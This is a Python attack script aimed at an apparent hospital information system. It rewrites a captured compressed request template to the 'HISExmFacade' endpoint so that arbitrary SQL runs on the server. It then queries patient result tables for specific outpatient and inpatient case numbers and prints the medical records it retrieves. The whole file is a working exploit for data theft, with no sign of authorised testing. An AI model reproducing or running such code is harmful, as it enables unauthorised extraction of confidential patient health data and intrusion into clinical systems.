from his_client_final import HISClient
import requests
import zlib
import re

class PatResultCaseHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = PatResultCaseHunter()
caseno = '46806581' # OPD Case
# Also try Inpatient Case
caseno_inp = '75176986'

queries = [
    f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_CASENO = '{caseno}'",
    f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_CASENO = '{caseno_inp}'"
]

for q in queries:
    print(f"--- Querying: {q} ---")
    res = hunter.execute_sql(q)
    if res and "<NewDataSet>" in res:
         print(f"!!! FOUND DATA IN PAT_RESULTH (CASENO) !!!")
         print(res[:5000])
         
         # If found, get details
         trx = re.findall(r'<PRH_TRX_NUM>(.*?)</PRH_TRX_NUM>', res)
         if trx:
             target = trx[0]
             print(f"Fetching details for TRX {target}...")
             q_det = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_TRX_NUM='{target}'"
             r_det = hunter.execute_sql(q_det)
             if r_det and "<NewDataSet>" in r_det:
                 print("!!! FOUND DETAILS !!!")
                 print(r_det[:5000])
             else:
                 print("[-] No details found.")
             break
    else:
        print("[-] No data.")
